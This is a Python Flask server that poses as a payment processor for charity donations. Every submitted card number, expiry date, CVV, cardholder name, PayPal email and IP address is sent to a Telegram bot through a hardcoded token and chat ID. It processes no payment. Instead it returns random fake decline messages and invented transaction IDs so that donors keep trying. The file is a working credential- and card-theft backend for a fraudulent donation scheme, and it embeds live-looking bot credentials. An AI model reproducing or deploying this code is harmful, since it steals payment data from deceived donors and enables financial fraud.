from flask import Flask, request, jsonify
import requests
from datetime import datetime
import random
import os
from dotenv import load_dotenv
import logging
from logging.handlers import RotatingFileHandler

# Load environment variables
load_dotenv()

# Initialize Flask app
app = Flask(__name__)

# Configure logging
log_handler = RotatingFileHandler('payment_processor.log', maxBytes=100000, backupCount=3)
log_handler.setLevel(logging.INFO)
formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
log_handler.setFormatter(formatter)
app.logger.addHandler(log_handler)

# Telegram Bot Settings - Load from environment with fallback (remove in production)
TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', '7845381383:AAG7cKGJzDvIhFM9fuWAua62QzpWRG0mN4k')
TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID', '7796858163')

# Security headers middleware
@app.after_request
def add_security_headers(response):
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    return response

def sanitize_input(input_data):
    """Basic input sanitization to prevent XSS"""
    if isinstance(input_data, str):
        return input_data.replace('<', '&lt;').replace('>', '&gt;')
    elif isinstance(input_data, dict):
        return {k: sanitize_input(v) for k, v in input_data.items()}
    elif isinstance(input_data, list):
        return [sanitize_input(item) for item in input_data]
    return input_data

def send_to_telegram(message):
    """Send message to Telegram bot with error handling"""
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message,
        'parse_mode': 'HTML'
    }
    try:
        response = requests.post(url, json=payload, timeout=10)
        response.raise_for_status()
        return True
    except requests.exceptions.RequestException as e:
        app.logger.error(f"Error sending to Telegram: {str(e)}")
        return False

def generate_fake_transaction_id():
    """Generate realistic-looking transaction ID"""
    timestamp = datetime.now().strftime('%Y%m%d%H%M%S')
    random_num = random.randint(1000, 9999)
    return f"TXN-{timestamp}-{random_num}"

def detect_card_type(card_number):
    """Detect credit card type based on number"""
    if not card_number or not isinstance(card_number, str):
        return 'Unknown'
    
    card_number = card_number.replace(" ", "")
    
    # Validate card number is digits only
    if not card_number.isdigit():
        return 'Unknown'
    
    # Card type detection
    if len(card_number) >= 1 and card_number[0] == '4':
        return 'Visa'
    elif len(card_number) >= 2:
        first_two = int(card_number[:2])
        if 51 <= first_two <= 55:
            return 'Mastercard'
        elif first_two in [34, 37]:
            return 'American Express'
        elif first_two in [36, 38, 39] or (len(card_number) >= 4 and 300 <= int(card_number[:3]) <= 305):
            return 'Diners Club'
        elif first_two == 35:
            return 'JCB'
    if len(card_number) >= 4:
        first_four = int(card_number[:4])
        if first_four == 6011 or (644 <= first_four <= 649) or int(card_number[:2]) == 65:
            return 'Discover'
        if 2221 <= first_four <= 2720:
            return 'Mastercard'
    
    return 'Unknown'

def mask_sensitive_data(data):
    """Mask sensitive information for logging"""
    if isinstance(data, dict):
        masked = {}
        for key, value in data.items():
            lower_key = key.lower()
            if 'card' in lower_key or 'number' in lower_key:
                masked[key] = f"****-****-****-{value[-4:]}" if value and len(value) > 4 else '****'
            elif 'cvv' in lower_key or 'cvc' in lower_key:
                masked[key] = '***'
            elif 'exp' in lower_key:
                masked[key] = '**/**'
            elif 'password' in lower_key or 'pass' in lower_key:
                masked[key] = '********'
            else:
                masked[key] = mask_sensitive_data(value)
        return masked
    elif isinstance(data, list):
        return [mask_sensitive_data(item) for item in data]
    return data

@app.route('/api/process_payment', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'])
def process_payment():
    try:
        # Log the incoming request
        app.logger.info(f"Incoming {request.method} request from {request.remote_addr}")
        
        # Handle different request methods
        if request.method == 'GET':
            data = request.args.to_dict()
        else:
            if request.is_json:
                data = request.get_json()
            else:
                data = request.form.to_dict()
        
        # Sanitize all input data
        data = sanitize_input(data)
        
        amount = data.get('amount', '0')
        payment_method = data.get('payment_method', 'unknown').lower()
        user_info = data.get('user_info', {})
        payment_details = data.get('payment_details', {})
        ip_address = request.remote_addr
        
        # Create timestamp
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Create detailed Telegram message
        message = f"""
<b>🚨 NEW DONATION ATTEMPT 🚨</b>

<b>Basic Info:</b>
💰 Amount: <code>${amount}</code>
💳 Method: <code>{payment_method.upper()}</code>
🌐 IP: <code>{ip_address}</code>
🕒 Time: <code>{timestamp}</code>
📤 Method: <code>{request.method}</code>

<b>User Info:</b>
"""
        if isinstance(user_info, dict):
            for key, value in user_info.items():
                message += f"🔹 {key}: <code>{value}</code>\n"
        else:
            message += f"🔹 User Info: <code>{user_info}</code>\n"

        message += "\n<b>Payment Details:</b>\n"
        
        if payment_method == 'card':
            card_number = payment_details.get('card_number', '') if isinstance(payment_details, dict) else ''
            message += f"""
🔸 Card Number: <code>{card_number}</code>
🔸 Card Type: <code>{detect_card_type(card_number)}</code>
🔸 Expiry: <code>{payment_details.get('expiry', 'N/A') if isinstance(payment_details, dict) else 'N/A'}</code>
🔸 CVV: <code>{payment_details.get('cvv', 'N/A') if isinstance(payment_details, dict) else 'N/A'}</code>
🔸 Name: <code>{payment_details.get('name', 'N/A') if isinstance(payment_details, dict) else 'N/A'}</code>
"""
        elif payment_method == 'paypal':
            message += f"""
🔸 PayPal Email: <code>{payment_details.get('email', 'N/A') if isinstance(payment_details, dict) else 'N/A'}</code>
"""
        elif payment_method == 'crypto':
            message += f"""
🔸 Crypto Type: <code>{payment_details.get('crypto_type', 'N/A') if isinstance(payment_details, dict) else 'N/A'}</code>
🔸 Wallet Address: <code>{payment_details.get('wallet', 'N/A') if isinstance(payment_details, dict) else 'N/A'}</code>
"""
            
        message += "\n<b>⚠️ THIS IS JUST A RECORD - NO REAL PAYMENT WAS PROCESSED ⚠️</b>"
        
        # Send to Telegram
        send_to_telegram(message)
        
        # Log the transaction (with sensitive data masked)
        app.logger.info("Processed payment attempt", extra={
            'data': mask_sensitive_data(data),
            'ip': ip_address,
            'timestamp': timestamp
        })
        
        # Error messages configuration
        error_messages = {
            'card': [
                "Your card was declined. Please check your card details or use a different payment method.",
                "We couldn't process your payment. Your bank may be rejecting the transaction.",
                "Card authorization failed. Please contact your bank for more information.",
                "Insufficient funds. Please use a different payment method."
            ],
            'paypal': [
                "PayPal service is temporarily unavailable. Please try again later.",
                "We couldn't connect to PayPal. Please check your credentials.",
                "PayPal authentication failed. Please try another payment method.",
                "Your PayPal account is restricted from making this payment."
            ],
            'crypto': [
                "Cryptocurrency payments are currently unavailable. Please try another method.",
                "The selected cryptocurrency is not supported at this time.",
                "Network congestion is delaying crypto transactions. Please try later.",
                "Invalid wallet address. Please verify and try again."
            ],
            'bank': [
                "Bank transfers are temporarily disabled. Please check back later.",
                "Our bank is currently processing other transactions. Please try again.",
                "International transfers are experiencing delays. Please use another method.",
                "Invalid bank details provided. Please verify your information."
            ]
        }
        
        # Select random error message for the payment method
        error_msg = random.choice(error_messages.get(payment_method, 
            ["Payment processing failed. Please try again later."]))
        
        return jsonify({
            'success': False,
            'message': error_msg,
            'error_code': 'PAYMENT_DECLINED',
            'transaction_id': generate_fake_transaction_id(),
            'support_email': 'support@alquds-relief.org',
            'timestamp': timestamp
        }), 400
        
    except Exception as e:
        app.logger.error(f"Error processing payment: {str(e)}", exc_info=True)
        return jsonify({
            'success': False,
            'message': "An unexpected server error occurred. Please try again.",
            'error_code': 'SERVER_ERROR'
        }), 500

if __name__ == '__main__':
    app.run(debug=False, port=5000, host='0.0.0.0')
